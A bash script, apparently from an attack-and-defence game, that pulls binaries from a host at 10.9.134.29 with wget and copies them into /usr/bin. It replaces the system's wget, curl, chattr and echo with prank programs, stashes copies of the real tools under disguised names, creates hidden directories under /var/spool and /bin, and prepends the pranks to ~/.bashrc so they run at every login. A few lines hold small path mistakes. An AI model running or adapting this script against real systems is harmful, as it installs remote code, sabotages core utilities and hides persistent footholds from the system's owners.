#!/bin/bash

wpath=$(which wget)
curlpath=$(which curl)
chattrpath=$(which chattr)
echopath=$(which echo)
chmodpath=$(which chmod)

wget 10.9.134.29:8000/parrot  
wget 10.9.134.29:8000/chattr  
wget 10.9.134.29:8000/cmatrix  
wget 10.9.134.29:8000/nyancat  
wget 10.9.134.29:8000/clocker  
wget 10.9.134.29:8000/clocker5

cp $chmodpath ./props
cp $curlpath ./nanoc
cp $wpath ./nanow
cp $echopath ./nanoe

chmod +x ch
chmod +x parrot
chmod +x cmatrix
chmod +x nyancat

cp ./parrot /usr/bin
cp ./nyancat /usr/bin
cp ./cmatrix /usr/bin

cp ./cmatrix $wpath
cp ./parrot $curlpath
cp ./nyancat $chattrpath
cp ./nyancat $echopath

mkdir /var/spool/.nano
mkdir /var/spool/.nano/.history
mkdir /bin/.screen
mkdir /bin/.screen/.config

cp -r $(pwd) /var/spool/.nano/.history
cp -r $(pwd) /bin/.screen/.config

mv ~/.bashrc ~/.bashrc_old
echo '/usr/bin/parrot' > ~/.bashrc
echo '/usr/bin/nyancat' >> ~/.bashrc
echo '/usr/bin/cmatrix' >> ~/.bashrc
cat ~/.bashrc_old >> ~/.bashrc
rm -rf bashrc_old
source ~/.bashrc
